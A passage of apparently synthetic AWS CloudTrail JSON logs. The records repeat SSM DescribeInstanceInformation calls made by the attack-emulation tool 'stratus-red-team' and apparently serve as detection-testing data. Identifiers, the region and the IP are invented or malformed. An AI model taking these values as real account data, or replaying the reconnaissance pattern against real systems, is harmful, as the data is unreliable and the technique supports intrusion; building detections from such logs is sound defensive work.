\"AIDA10CZIPPG73T21TDI\",\n         \"type\": \"IAMUser\",\n         \"userName\": \"christophe\"\n      }\n   },\n   {\n      \"awsRegion\": \"sagov-westsouth-1r\",\n      \"eventCategory\": \"Management\",\n      \"eventID\": \"df4e2a35-15df-4329-9b51-f260dcefba7b\",\n      \"eventName\": \"DescribeInstanceInformation\",\n      \"eventSource\": \"ssm.amazonaws.com\",\n      \"eventTime\": \"2024-08-02T09:08:19Z\",\n      \"eventType\": \"AwsApiCall\",\n      \"eventVersion\": \"1.08\",\n      \"managementEvent\": true,\n      \"readOnly\": true,\n      \"recipientAccountId\": \"056392974792\",\n      \"requestID\": \"fe3cc368-5dd9-4629-8db6-966b9b396005\",\n      \"requestParameters\": {\n         \"filters\": [\n            {\n               \"key\": \"InstanceIds\",\n               \"values\": [\n                  \"i-00456A8D163f546Ff\",\n                  \"i-cfE23b1a7ceba6f86\",\n                  \"i-9D40CCFc0aE91CFa5\"\n               ]\n            }\n         ]\n      },\n      \"responseElements\": null,\n      \"sourceIPAddress\": \"253.252.51.07\",\n      \"tlsDetails\": {\n         \"cipherSuite\": \"ECDHE-RSA-AES128-GCM-SHA256\",\n         \"clientProvidedHostHeader\": \"ssm.sagov-westsouth-1r.amazonaws.com\",\n         \"tlsVersion\": \"TLSv1.2\"\n      },\n      \"userAgent\": \"stratus-red-team_ea782787-a65d-4fc4-9fca-1c97869a9a25\",\n      \"userIdentity\": {\n         \"accessKeyId\": \"AKIAW9X2Q2U25SK79UCX\",\n         \"accountId\": \"056392974792\",\n         \"arn\": \"arn:aws:iam::056392974792:user/christophe\",\n         \"principalId\": \"AIDA10CZIPPG73T21TDI\",\n         \"type\": \"IAMUser\",\n         \"userName\": \"christophe\"\n      }\n   },\n   {\n      \"awsRegion\": \"sagov-westsouth-1r\",\n      \"eventCategory\": \"Management\",\n      \"eventID\": \"414a9a7c-01f3-4acc-9b55-bf1f677e3a54\",\n      \"eventName\": \"DescribeInstanceInformation\",\n      \"eventSource\": \"ssm.amazonaws.com\",\n      \"eventTime\": \"2024-08-02T09:08:17Z\",\n      \"eventType\": \"AwsApiCall\",\n      \"eventVersion\": \"1.08\",\n      \"managementEvent\": true,\n      \"readOnly\": true,\n      \"recipientAccountId\": \"056392974792\",\n      \"requestID\": \"6425b4c5-5688-4d8f-8165-cf0b565cdb72\",\n      \"requestParameters\": {\n         \"filters\": [\n            {\n               \"key\": \"InstanceIds\",\n               \"values\": [\n                  \"i-00456A8D163f546Ff\",\n                  \"i-cfE23b1a7ceba6f86\",\n                  \"i-9D40CCFc0aE91CFa5\"\n               ]\n            }\n         ]\n      },\n      \"responseElements\": null,\n      \"sourceIPAddress\": \"253.252.51.07\",\n      \"tlsDetails\": {\n         \"cipherSuite\": \"ECDHE-RSA-AES128-GCM-SHA256\",\n         \"clientProvidedHostHeader\": \"ssm.sagov-westsouth-1r.amazonaws.com\",\n         \"tlsVersion\": \"TLSv1.2\"\n      },\n      \"userAgent\": \"stratus-red-team_ea782787-a65d-4fc4-9fca-1c97869a9a25\",\n      \"userIdentity\": {\n         \"accessKeyId\": \"AKIAW9X2Q2U25SK79UCX\",\n         \"accountId\": \"056392974792\",\n         \"arn\": \"arn:aws:iam::056392974792:user/christophe\",\n         \"principalId\": \"AIDA10CZIPPG73T21TDI\",\n         \"type\": \"IAMUser\",\n         \"userName\": \"christophe\"\n      }\n   },\n   {\n      \"awsRegion\": \"sagov-westsouth-1r\",\n      \"eventCategory\": \"Management\",\n      \"eventID\": \"2c1e26d1-6685-4640-ba79-81149872d066\",\n      \"eventName\": \"DescribeInstanceInformation\",\n      \"eventSource\": \"ssm.amazonaws.com\",\n      \"eventTime\": \"2024-08-02T09:08:16Z\",\n      \"eventType\": \"AwsApiCall\",\n      \"eventVersion\": \"1.08\",\n      \"managementEvent\": true,\n      \"readOnly\": true,\n      \"recipientAccountId\": \"056392974792\",\n      \"requestID\": \"0ea54e95-cde4-4aec-9ef3-d28f44594966\",\n      \"requestParameters\": {\n         \"filters\": [\n            {\n               \"key\": \"InstanceIds\",\n               \"values\": [\n                  \"i-00456A8D163f546Ff\",\n                  \"i-cfE23b1a7ceba6f86\",\n                  \"i-9D40CCFc0aE91CFa5\"\n               ]\n            }\n         ]\n      },\n      \"responseElements\": null,\n      \"sourceIPAddress\": \"253.252.51.07\",\n      \"tlsDetails\": {\n         \"cipherSuite\": \"ECDHE-RSA-AES128-GCM-SHA256\",\n         \"clientProvidedHostHeader\": \"ssm.sagov-westsouth-1r.amazonaws.com\",\n         \"tlsVersion\": \"TLSv1.2\"\n      },\n      \"userAgent\": \"stratus-red-team_ea782787-a65d-4fc4-9fca-1c97869a9a25\",\n      \"userIdentity\": {\n         \"accessKeyId\": \"AKIAW9X2Q2U25SK79UCX\",\n         \"accountId\": \"056392974792\",\n         \"arn\": \"arn:aws:iam::056392974792:user/christophe\",\n         \"principalId\": \"AIDA10CZIPPG73T21TDI\",\n         \"type\": \"IAMUser\",\n         \"userName\": \"christophe\"\n      }\n   },\n   {\n      \"awsRegion\": \"sagov-westsouth-1r\",\n      \"eventCategory\": \"Management\",\n      \"eventID\": \"a4ca6ef1-b00e-476a-8dcf-6b1b2e75b335\",\n      \"eventName\": \"DescribeInstanceInformation\",\n      \"eventSource\": \"ssm.amazonaws.com\",\n      \"eventTime\": \"2024-08-02T09:08:15Z\",\n      \"eventType\": \"AwsApiCall\",\n      \"eventVersion\": \"1.08\",\n      \"managementEvent\": true,\n      \"readOnly\": true,\n      \"recipientAccountId\": \"056392974792\",\n      \"requestID\": \"0c49d64c-5995-485c-930f-fbb3fcda42ab\",\n      \"requestParameters\": {\n         \"filters\": [\n            {\n               \"key\": \"InstanceIds\",\n               \"values\": [\n                  \"i-00456A8D163f546Ff\",\n                  \"i-cfE23b1a7ceba6f86\",\n                  \"i-9D40CCFc0aE91CFa5\"\n               ]\n            }\n         ]\n      },\n      \"responseElements\": null,\n      \"sourceIPAddress\": \"253.252.51.07\",\n      \"tlsDetails\": {\n         \"cipherSuite\": \"ECDHE-RSA-AES128-GCM-SHA256\",\n         \"clientProvidedHostHeader\": \"ssm.sagov-westsouth-1r.amazonaws.com\",\n         \"tlsVersion\": \"TLSv1.2\"\n      },\n      \"userAgent\": \"stratus-red-team_ea782787-a65d-4fc4-9fca-1c97869a9a25\",\n      \"userIdentity\": {\n         \"accessKeyId\": \"AKIAW9X2Q2U25SK79UCX\",\n         \"accountId\": \"056392974792\",\n         \"arn\": \"arn:aws:iam::056392974792:user/christophe\",\n         \"principalId\": \"AIDA10CZIPPG73T21TDI\",\n         \"type\": \"IAMUser\",\n         \"userName\": \"christophe\"\n      }\n   },\n   {\n      \"awsRegion\": \"sagov-westsouth-1r\",\n      \"eventCategory\": \"Management\",\n      \"eventID\": \"2b3aacaa-3e89-405c-b53b-f99a0555661d\",\n      \"eventName\": \"DescribeInstanceInformation\",\n      \"eventSource\": \"ssm.amazonaws.com\",\n      \"eventTime\": \"2024-08-02T09:08:14Z\",\n      \"eventType\": \"AwsApiCall\",\n      \"eventVersion\": \"1.08\",\n      \"managementEvent\": true,\n      \"readOnly\": true,\n      \"recipientAccountId\": \"056392974792\",\n      \"requestID\": \"2abe2e44-53f2-4207-825e-dc569c2be9f5\",\n      \"requestParameters\": {\n         \"filters\": [\n            {\n               \"key\": \"InstanceIds\",\n               \"values\": [\n                  \"i-00456A8D163f546Ff\",\n                  \"i-cfE23b1a7ceba6f86\",\n                  \"i-9D40CCFc0aE91CFa5\"\n               ]\n            }\n         ]\n      },\n      \"responseElements\": null,\n      \"sourceIPAddress\": \"253.252.51.07\",\n      \"tlsDetails\": {\n         \"cipherSuite\": \"ECDHE-RSA-AES128-GCM-SHA256\",\n         \"clientProvidedHostHeader\": \"ssm.sagov-westsouth-1r.amazonaws.com\",\n         \"tlsVersion\": \"TLSv1.2\"\n      },\n      \"userAgent\": \"stratus-red-team_ea782787-a65d-4fc4-9fca-1c97869a9a25\",\n      \"userIdentity\": {\n         \"accessKeyId\": \"AKIAW9X2Q2U25SK79UCX\",\n         \"accountId\": \"056392974792\",\n         \"arn\": \"arn:aws:iam::056392974792:user/christophe\",\n         \"principalId\": \"AIDA10CZIPPG73T21TDI\",\n         \"type\": \"IAMUser\",\n         \"userName\": \"christophe\"\n      }\n   },\n   {\n      \"awsRegion\": \"sagov-westsouth-1r\",\n      \"eventCategory\": \"Management\",\n      \"eventID\": \"2610da37-3b46-48b2-82b3-59e0c77c9db0\",\n      \"eventName\": \"DescribeInstanceInformation\",\n      \"eventSource\": \"ssm.amazonaws.com\",\n      \"eventTime\": \"2024-08-02T09:08:13Z\",\n      \"eventType\": \"AwsApiCall\",\n      \"eventVersion\": \"1.08\",\n      \"managementEvent\": true,\n      \"readOnly\": true,\n      \"recipientAccountId\": \"056392974792\",\n      \"requestID\": \"c2320169-a590-4aa4-bfbe-73d0eef783fa\",\n      \"requestParameters\": {\n         \"filters\": [\n            {\n               \"key\": \"InstanceIds\",\n               \"values\": [\n                  \"i-00456A8D163f546Ff\",\n                  \"i-cfE23b1a7ceba6f86\",\n                  \"i-9D40CCFc0aE91CFa5\"\n               ]\n            }\n         ]\n      },\n      \"responseElements\": null,\n      \"sourceIPAddress\": \"253.252.51.07\",\n      \"tlsDetails\": {\n         \"cipherSuite\": \"ECDHE-RSA-AES128-GCM-SHA256\",\n         \"clientProvidedHostHeader\": \"ssm.sagov-westsouth-1r.amazonaws.com\",\n         \"tlsVersion\": \"TLSv1.2\"\n      },\n      \"userAgent\": \"stratus-red-team_ea782787-a65d-4fc4-9fca-1c97869a9a25\",\n      \"userIdentity\": {\n         \"accessKeyId\": \"AKIAW9X2Q2U25SK79UCX\",\n         \"accountId\": \"056392974792\",\n         \"arn\": \"arn:aws:iam::056392974792:user/christophe\",\n         \"principalId\": \"AIDA10CZIPPG73T21TDI\",\n         \"type\": \"IAMUser\",\n         \"userName\": \"christophe\"\n      }\n   },\n   {\n      \"awsRegion\": \"sagov-westsouth-1r\",\n      \"eventCategory\": \"Management\",\n      \"eventID\": \"04151503-f5e2-4356-abdd-14b08e2285ef\",\n      \"eventName\": \"DescribeInstanceInformation\",\n      \"eventSource\": \"ssm.amazonaws.com\",\n      \"eventTime\": \"2024-08-02T09:08:12Z\",\n      \"eventType\": \"AwsApiCall\",\n      \"eventVersion\": \"1.08\",\n      \"managementEvent\": true,\n      \"readOnly\": true,\n      \"recipientAccountId\": \"056392974792\",\n      \"requestID\": \"61a85904-a3b8-4dd6-aaef-2efd548cf9ae\",\n      \"requestParameters\": {\n         \"filters\": [\n            {\n               \"key\": \"InstanceIds\",\n               \"values\": [\n                  \"i-00456A8D163f546Ff\",\n                  \"i-cfE23b1a7ceba6f86\",\n                  \"i-9D40CCFc0aE91CFa5\"\n               ]\n            }\n         ]\n      },\n      \"responseElements\": null,\n      \"sourceIPAddress\": \"253.252.51.07\",\n      \"tlsDetails\": {\n         \"cipherSuite\": \"ECDHE-RSA-AES128-GCM-SHA256\",\n         \"clientProvidedHostHeader\": \"ssm.sagov-westsouth-1r.amazonaws.com\",\n         \"tlsVersion\": \"TLSv1.2\"\n      },\n      \"userAgent\": \"stratus-red-team_ea782787-a65d-4fc4-9fca-1c97869a9a25\",\n      \"userIdentity\": {\n         \"accessKeyId\": \"AKIAW9X2Q2U25SK79UCX\",\n         \"accountId\": \"056392974792\",\n         \"arn\": \"arn:aws:iam::056392974792:user/christophe\",\n         \"principalId\": \"AIDA10CZIPPG73T21TDI\",\n         \"type\": \"IAMUser\",\n         \"userName\": \"christophe\"\n      }\n   },\n   {\n      \"awsRegion\": \"sagov-westsouth-1r\",\n      \"eventCategory\": \"Management\",\n      \"eventID\": \"898fc3e2-242e-48f1-a560-8b835d90bdee\",\n      \"eventName\": \"DescribeInstanceInformation\",\n      \"eventSource\": \"ssm.amazonaws.com\",\n      \"eventTime\": \"2024-08-02T09:08:10Z\",\n      \"eventType\": \"AwsApiCall\",\n      \"eventVersion\": \"1.08\",\n      \"managementEvent\": true,\n      \"readOnly\": true,\n      \"recipientAccountId\": \"056392974792\",\n      \"requestID\": \"8931849b-3dbb-440f-ac27-1fb5d4890d3b\",\n      \"requestParameters\": {\n         \"filters\": [\n            {\n               \"key\": \"InstanceIds\",\n               \"values\": [\n                  \"i-00456A8D163f546Ff\",\n                  \"i-cfE23b1a7ceba6f86\",\n                  \"i-9D40CCFc0aE91CFa5\"\n               ]\n            }\n         ]\n      },\n      \"responseElements\": null,\n      \"sourceIPAddress\": \"253.252.51.07\",\n      \"tlsDetails\": {\n         \"cipherSuite\": \"ECDHE-RSA-AES128-GCM-SHA256\",\n         \"clientProvidedHostHeader\": \"ssm.sagov-westsouth-1r.amazonaws.com\",\n         \"tlsVersion\": \"TLSv1.2\"\n      },\n      \"userAgent\": \"stratus-red-team_ea782787-a65d-4fc4-9fca-1c97869a9a25\",\n      \"userIdentity\": {\n         \"accessKeyId\": \"AKIAW9X2Q2U25SK79UCX\",\n         \"accountId\": \"056392974792\",\n         \"arn\": \"arn:aws:iam::056392974792:user/christophe\",\n         \"principalId\": \"AIDA10CZIPPG73T21TDI\",\n         \"type\": \"IAMUser\",\n         \"userName\": \"christophe\"\n      }\n   },\n   {\n      \"awsRegion\": \"sagov-westsouth-1r\",\n      \"eventCategory\": \"Management\",\n      \"eventID\": \"411687aa-d840-40f7-ae31-adb0619c0401\",\n      \"eventName\": \"DescribeInstanceInformation\",\n      \"eventSource\": \"ssm.amazonaws.com\",\n      \"eventTime\": \"2024-08-02T09:08:09Z\",\n      \"eventType\": \"AwsApiCall\",\n      \"eventVersion\": \"1.08\",\n      \"managementEvent\": true,\n      \"readOnly\": true,\n      \"recipientAccountId\": \"056392974792\",\n      \"requestID\": \"003bfa5a-ef20-46b7-bf79-8a11a49ab14e\",\n      \"requestParameters\": {\n         \"filters\": [\n            {\n               \"key\": \"InstanceIds\",\n               \"values\": [\n                  \"i-00456A8D163f546Ff\",\n                  \"i-cfE23b1a7ceba6f86\",\n                  \"i-9D40CCFc0aE91CFa5\"\n               ]\n            }\n         ]\n      },\n      \"responseElements\": null,\n      \"sourceIPAddress\": \"253.252.51.07\",\n      \"tlsDetails\": {\n         \"cipherSuite\": \"ECDHE-RSA-AES128-GCM-SHA256\",\n         \"clientProvidedHostHeader\": \"ssm.sagov-westsouth-1r.amazonaws.com\",\n         \"tlsVersion\": \"TLSv1.2\"\n      },\n      \"userAgent\": \"stratus-red-team_ea782787-a65d-4fc4-9fca-1c97869a9a25\",\n      \"userIdentity\": {\n         \"accessKeyId\": \"AKIAW9X2Q2U25SK79UCX\",\n         \"accountId\": \"056392974792\",\n         \"arn\": \"arn:aws:iam::056392974792:user/christophe\",\n         \"principalId\": \"AIDA10CZIPPG73T21TDI\",\n         \"type\": \"IAMUser\",\n         \"userName\": \"christophe\"\n      }\n   },\n   {\n      \"awsRegion\": \"sagov-westsouth-1r\",\n      \"eventCategory\": \"Management\",\n      \"eventID\": \"ff20ced4-0e3c-42a7-9ed9-f32cd2cbb672\",\n      \"eventName\": \"DescribeInstanceInformation\",\n      \"eventSource\": \"ssm.amazonaws.com\",\n      \"eventTime\": \"2024-08-02T09:08:08Z\",\n      \"eventType\": \"AwsApiCall\",\n      \"eventVersion\": \"1.08\",\n      \"managementEvent\": true,\n      \"readOnly\": true,\n      \"recipientAccountId\": \"056392974792\",\n      \"requestID\": \"0234c68e-9ebe-4fc5-81ab-798de9bdc451\",\n      \"requestParameters\": {\n         \"filters\": [\n            {\n               \"key\": \"InstanceIds\",\n               \"values\": [\n                  \"i-00456A8D163f546Ff\",\n                  \"i-cfE23b1a7ceba6f86\",\n                  \"i-9D40CCFc0aE91CFa5\"\n               ]\n            }\n         ]\n      },\n      \"responseElements\": null,\n      \"sourceIPAddress\": \"253.252.51.07\",\n      \"tlsDetails\": {\n         \"cipherSuite\": \"ECDHE-RSA-AES128-GCM-SHA256\",\n         \"clientProvidedHostHeader\": \"ssm.sagov-westsouth-1r.amazonaws.com\",\n         \"tlsVersion\": \"TLSv1.2\"\n      },\n      \"userAgent\": \"stratus-red-team_ea782787-a65d-4fc4-9fca-1c97869a9a25\",\n      \"userIdentity\": {\n         \"accessKeyId\": \"AKIAW9X2Q2U25SK79UCX\",\n         \"accountId\": \"056392974792\",\n         \"arn\": \"arn:aws:iam::056392974792:user/christophe\",\n         \"principalId\": \"AIDA10CZIPPG73T21TDI\",\n         \"type\": \"IAMUser\",\n         \"userName\": \"christophe\"\n      }\n   },\n   {\n      \"awsRegion\": \"sagov-westsouth-1r\",\n      \"eventCategory\": \"Management\",\n      \"eventID\": \"e0643796-b464-4e13-8680-00c6dc57ef72\",\n      \"eventName\": \"DescribeInstanceInformation\",\n      \"eventSource\": \"ssm.amazonaws.com\",\n      \"eventTime\": \"2024-08-02T09:08:07Z\",\n      \"eventType\": \"AwsApiCall\",\n      \"eventVersion\": \"1.08\",\n      \"managementEvent\": true,\n      \"readOnly\": true,\n      \"recipientAccountId\": \"056392974792\",\n      \"requestID\": \"1543ba41-1625-45c3-8f4f-ab5463d68b02\",\n      \"requestParameters\": {\n         \"filters\": [\n            {\n               \"key\": \"InstanceIds\",\n               \"values\": [\n                  \"i-00456A8D163f546Ff\",\n                  \"i-cfE23b1a7ceba6f86\",\n                  \"i-9D40CCFc0aE91CFa5\"\n               ]\n            }\n         ]\n      },\n      \"responseElements\": null,\n      \"sourceIPAddress\": \"253.252.51.07\",\n      \"tlsDetails\": {\n         \"cipherSuite\": \"ECDHE-RSA-AES128-GCM-SHA256\",\n         \"clientProvidedHostHeader\": \"ssm.sagov-westsouth-1r.amazonaws.com\",\n         \"tlsVersion\": \"TLSv1.2\"\n      },\n      \"userAgent\": \"stratus-red-team_ea782787-a65d-4fc4-9fca-1c97869a9a25\",\n      \"userIdentity\": {\n         \"accessKeyId\": \"AKIAW9X2Q2U25SK79UCX\",\n         \"accountId\": \"056392974792\",\n         \"arn\": \"arn:aws:iam::056392974792:user/christophe\",\n         \"principalId\": \"AIDA10CZIPPG73T21TDI\",\n         \"type\": \"IAMUser\",\n         \"userName\": \"christophe\"\n      }\n   },\n   {\n      \"awsRegion\": \"sagov-westsouth-1r\",\n      \"eventCategory\": \"Management\",\n      \"eventID\": \"1540ea9a-4d6b-45b5-b84d-e9711e7801fb\",\n      \"eventName\": \"DescribeInstanceInformation\",\n      \"eventSource\": \"ssm.amazonaws.com\",\n      \"eventTime\": \"2024-08-02T09:08:06Z\",\n      \"eventType\": \"AwsApiCall\",\n      \"eventVersion\": \"1.08\",\n      \"managementEvent\": true,\n      \"readOnly\": true,\n      \"recipientAccountId\": \"056392974792\",\n      \"requestID\": \"0e53ee03-5e82-4bcc-80fe-1f5929260121\",\n      \"requestParameters\": {\n         \"filters\": [\n            {\n               \"key\": \"InstanceIds\",\n               \"values\": [\n                  \"i-00456A8D163f546Ff\",\n                  \"i-cfE23b1a7ceba6f86\",\n                  \"i-9D40CCFc0aE91CFa5\"\n               ]\n            }\n         ]\n      },\n      \"responseElements\": null,\n      \"sourceIPAddress\": \"253.252.51.07\",\n      \"tlsDetails\": {\n         \"cipherSuite\": \"ECDHE-RSA-AES128-GCM-SHA256\",\n         \"clientProvidedHostHeader\": \"ssm.sagov-westsouth-1r.amazonaws.com\",\n         \"tlsVersion\": \"TLSv1.2\"\n      },\n      \"userAgent\": \"stratus-red-team_ea782787-a65d-4fc4-9fca-1c97869a9a25\",\n      \"userIdentity\": {\n         \"accessKeyId\": \"AKIAW9X2Q2U25SK79UCX\",\n         \"accountId\": \"056392974792\",\n         \"arn\": \"arn:aws:iam::056392974792:user/christophe\",\n         \"principalId\": \"AIDA10CZIPPG73T21TDI\",\n         \"type\": \"IAMUser\",\n         \"userName\": \"christophe\"\n      }\n   },\n   {\n      \"awsRegion\": \"sagov-westsouth-1r\",\n      \"eventCategory\": \"Management\",\n      \"eventID\": \"0d989ab9-09ae-44c4-9dc8-3f3c9aa4f4b1\",\n      \"eventName\": \"DescribeInstanceInformation\",\n      \"eventSource\": \"ssm.amazonaws.com\",\n      \"eventTime\": \"2024-08-02T09:08:05Z\",\n      \"eventType\": \"AwsApiCall\",\n      \"eventVersion\": \"1.08\",\n      \"managementEvent\": true,\n      \"readOnly\": true,\n      \"recipientAccountId\": \"056392974792\",\n      \"requestID\": \"cdea3227-f206-4316-8ba4-980b36f6124a\",\n      \"requestParameters\": {\n         \"filters\": [\n            {\n               \"key\": \"InstanceIds\",\n               \"values\": [\n                  \"i-00456A8D163f546Ff\",\n                  \"i-cfE23b1a7ceba6f86\",\n                  \"i-9D40CCFc0aE91CFa5\"\n               ]\n            }\n         ]\n      },\n      \"responseElements\": null,\n      \"sourceIPAddress\": \"253.252.51.07\",\n      \"tlsDetails\": {\n         \"cipherSuite\": \"ECDHE-RSA-AES128-GCM-SHA256\",\n         \"clientProvidedHostHeader\": \"ssm.sagov-westsouth-1r.amazonaws.com\",\n         \"tlsVersion\": \"TLSv1.2\"\n      },\n      \"userAgent\": \"stratus-red-team_ea782787-a65d-4fc4-9fca-1c97869a9a25\",\n      \"userIdentity\": {\n         \"accessKeyId\": \"AKIAW9X2Q2U25SK79UCX\",\n         \"accountId\": \"056392974792\",\n         \"arn\": \"arn:aws:iam::056392974792:user/christophe\",\n         \"principalId\": \"AIDA10CZIPPG73T21TDI\",\n         \"type\": \"IAMUser\",\n         \"userName\": \"christophe\"\n      }\n   },\n   {\n      \"awsRegion\": \"sagov-westsouth-1r\",\n      \"eventCategory\": \"Management\",\n      \"eventID\": \"ab4521b5-0b95-4e01-bc57-9124138b6d07\",\n      \"eventName\": \"DescribeInstanceInformation\",\n      \"eventSource\": \"ssm.amazonaws.com\",\n      \"eventTime\": \"2024-08-02T09:08:04Z\",\n      \"eventType\": \"AwsApiCall\",\n      \"eventVersion\": \"1.08\",\n      \"managementEvent\": true,\n      \"readOnly\": true,\n      \"recipientAccountId\": \"056392974792\",\n      \"requestID\": \"581d7a02-356c-4b34-88ff-0570f6fb1d2b\",\n      \"requestParameters\": {\n         \"filters\": [\n            {\n               \"key\": \"InstanceIds\",\n               \"values\": [\n                  \"i-00456A8D163f546Ff\",\n                  \"i-cfE23b1a7ceba6f86\",\n                  \"i-9D40CCFc0aE91CFa5\"\n               ]\n            }\n         ]\n      },\n      \"responseElements\": null,\n      \"sourceIPAddress\": \"253.252.51.07\",\n      \"tlsDetails\": {\n         \"cipherSuite\": \"ECDHE-RSA-AES128-GCM-SHA256\",\n         \"clientProvidedHostHeader\": \"ssm.sagov-westsouth-1r.amazonaws.com\",\n         \"tlsVersion\": \"TLSv1.2\"\n      },\n      \"userAgent\": \"stratus-red-team_ea782787-a65d-4fc4-9fca-1c97869a9a25\",\n      \"userIdentity\": {\n         \"accessKeyId\": \"AKIAW9X2Q2U25SK79UCX\",\n         \"accountId\": \"056392974792\",\n         \"arn\": \"arn:aws:iam::056392974792:user/christophe\",\n         \"principalId\": \"AIDA10CZIPPG73T21TDI\",\n         \"type\": \"IAMUser\",\n         \"userName\": \"christophe\"\n      }\n   },\n   {\n      \"awsRegion\": \"sagov-westsouth-1r\",\n      \"eventCategory\": \"Management\",\n      \"eventID\": \"150f7722-557f-47a7-849c-5c44cba78e2e\",\n      \"eventName\": \"DescribeInstanceInformation\",\n      \"eventSource\": \"ssm.amazonaws.com\",\n      \"eventTime\": \"2024-08-02T09:08:02Z\",\n      \"eventType\": \"AwsApiCall\",\n      \"eventVersion\": \"1.08\",\n      \"managementEvent\": true,\n      \"readOnly\": true,\n      \"recipientAccountId\": \"056392974792\",\n      \"requestID\": \"3674ec77-adc1-4474-aad5-a1a6fed8b8d4\",\n      \"requestParameters\": {\n         \"filters\": [\n            {\n               \"key\": \"InstanceIds\",\n               \"values\": [\n                  \"i-00456A8D163f546Ff\",\n                  \"i-cfE23b1a7ceba6f86\",\n                  \"i-9D40CCFc0aE91CFa5\"\n               ]\n            }\n         ]\n      },\n      \"responseElements\": null,\n      \"sourceIPAddress\": \"253.252.51.07\",\n      \"tlsDetails\": {\n         \"cipherSuite\": \"ECDHE-RSA-AES128-GCM-SHA256\",\n         \"clientProvidedHostHeader\": \"ssm.sagov-westsouth-1r.amazonaws.com\",\n         \"tlsVersion\": \"TLSv1.2\"\n      },\n      \"userAgent\": \"stratus-red-team_ea782787-a65d-4fc4-9fca-1c97869a9a25\",\n      \"userIdentity\": {\n         \"accessKeyId\": \"AKIAW9X2Q2U25SK79UCX\",\n         \"accountId\": \"056392974792\",\n         \"arn\": \"arn:aws:iam::056392974792:user/christophe\",\n         \"principalId\": \"AIDA10CZIPPG73T21TDI\",\n         \"type\": \"IAMUser\",\n         \"userName\": \"christophe\"\n      }\n   },\n   {\n      \"awsRegion\": \"sagov-westsouth-1r\",\n      \"eventCategory\": \"Management\",\n      \"eventID\": \"c68a4a51-cfc2-490d-86da-f0aff1e000e6\",\n      \"eventName\": \"DescribeInstanceInformation\",\n      \"eventSource\": \"ssm.amazonaws.com\",\n      \"eventTime\": \"2024-08-02T09:08:01Z\",\n      \"eventType\": \"AwsApiCall\",\n      \"eventVersion\": \"1.08\",\n      \"managementEvent\": true,\n      \"readOnly\": true,\n      \"recipientAccountId\": \"056392974792\",\n      \"requestID\": \"ab1a6ced-43d6-459c-b67b-6c1acb255fd8\",\n      \"requestParameters\": {\n         \"filters\": [\n            {\n               \"key\": \"InstanceIds\",\n               \"values\": [\n                  \"i-00456A8D163f546Ff\",\n                  \"i-cfE23b1a7ceba6f86\",\n                  \"i-9D40CCFc0aE91CFa5\"\n               ]\n            }\n         ]\n      },\n      \"responseElements\": null,\n      \"sourceIPAddress\": \"253.252.51.07\",\n      \"tlsDetails\": {\n         \"cipherSuite\": \"ECDHE-RSA-AES128-GCM-SHA256\",\n         \"clientProvidedHostHeader\": \"ssm.sagov-westsouth-1r.amazonaws.com\",\n         \"tlsVersion\": \"TLSv1.2\"\n      },\n      \"userAgent\": \"stratus-red-team_ea782787-a65d-4fc4-9fca-1c97869a9a25\",\n      \"userIdentity\": {\n         \"accessKeyId\": \"AKIAW9X2Q2U25SK79UCX\",\n         \"accountId\": \"056392974792\",\n         \"arn\": \"arn:aws:iam::056392974792:user/christophe\",\n         \"principalId\": \"AIDA10CZIPPG73T21TDI\",\n         \"type\": \"IAMUser\",\n         \"userName\": \"christophe\"\n      }\n   },\n   {\n      \"awsRegion\": \"sagov-westsouth-1r\",\n      \"eventCategory\": \"Management\",\n      \"eventID\": \"2582b47b-76b8-4eb4-a455-9f97b000d38a\",\n      \"eventName\": \"DescribeInstanceInformation\",\n      \"eventSource\": \"ssm.amazonaws.com\",\n      \"eventTime\": \"2024-08-02T09:08:00Z\",\n      \"eventType\": \"AwsApiCall\",\n      \"eventVersion\": \"1.08\",\n      \"managementEvent\": true,\n      \"readOnly\": true,\n      \"recipientAccountId\": \"056392974792\",\n      \"requestID\": \"fe6366b5-7c41-4a98-ab58-fa895d8d71f8\",\n      \"requestParameters\": {\n         \"filters\": [\n            {\n               \"key\": \"InstanceIds\",\n               \"values\": [\n                  \"i-00456A8D163f546Ff\",\n                  \"i-cfE23b1a7ceba6f86\",\n                  \"i-9D40CCFc0aE91CFa5\"\n               ]\n            }\n         ]\n      },\n      \"responseElements\": null,\n      \"sourceIPAddress\": \"253.252.51.07\",\n      \"tlsDetails\": {\n         \"cipherSuite\": \"ECDHE-RSA-AES128-GCM-SHA256\",\n         \"clientProvidedHostHeader\": \"ssm.sagov-westsouth-1r.amazonaws.com\",\n         \"tlsVersion\": \"TLSv1.2\"\n      },\n      \"userAgent\": \"stratus-red-team_ea782787-a65d-4fc4-9fca-1c97869a9a25\",\n      \"userIdentity\": {\n         \"accessKeyId\": \"AKIAW9X2Q2U25SK79UCX\",\n         \"accountId\": \"056392974792\",\n         \"arn\": \"arn:aws:iam::056392974792:user/christophe\",\n         \"principalId\": \"AIDA10CZIPPG73T21TDI\",\n         \"type\": \"IAMUser\",\n         \"userName\": \"christophe\"\n      }\n   },\n   {\n      \"awsRegion\": \"sagov-westsouth-1r\",\n      \"eventCategory\": \"Management\",\n      \"eventID\": \"aa35aa1c-1989-4beb-a540-2a47b88a2119\",\n      \"eventName\": \"DescribeInstanceInformation\",\n      \"eventSource\": \"ssm.amazonaws.com\",\n      \"eventTime\": \"2024-08-02T09:07:59Z\",\n      \"eventType\": \"AwsApiCall\",\n      \"eventVersion\": \"1.08\",\n      \"managementEvent\": true,\n      \"readOnly\": true,\n      \"recipientAccountId\": \"056392974792\",\n      \"requestID\": \"7c848a81-1e4b-4457-a067-ede23efb8f96\",\n      \"requestParameters\": {\n         \"filters\": [\n            {\n               \"key\": \"InstanceIds\",\n               \"values\": [\n                  \"i-00456A8D163f546Ff\",\n                  \"i-cfE23b1a7ceba6f86\",\n                  \"i-9D40CCFc0aE91CFa5\"\n               ]\n            }\n         ]\n      },\n      \"responseElements\": null,\n      \"sourceIPAddress\": \"253.252.51.07\",\n      \"tlsDetails\": {\n         \"cipherSuite\": \"ECDHE-RSA-AES128-GCM-SHA256\",\n         \"clientProvidedHostHeader\": \"ssm.sagov-westsouth-1r.amazonaws.com\",\n         \"tlsVersion\": \"TLSv1.2\"\n      },\n      \"userAgent\": \"stratus-red-team_ea782787-a65d-4fc4-9fca-1c97869a9a25\",\n      \"userIdentity\": {\n         \"accessKeyId\": \"AKIAW9X2Q2U25SK79UCX\",\n         \"accountId\": \"056392974792\",\n         \"arn\": \"arn:aws:iam::056392974792:user/christophe\",\n         \"principalId\": \"AIDA10CZIPPG73T21TDI\",\n         \"type\": \"IAMUser\",\n         \"userName\": \"christophe\"\n      }\n   },\n   {\n      \"awsRegion\": \"sagov-westsouth-1r\",\n      \"eventCategory\": \"Management\",\n      \"eventID\": 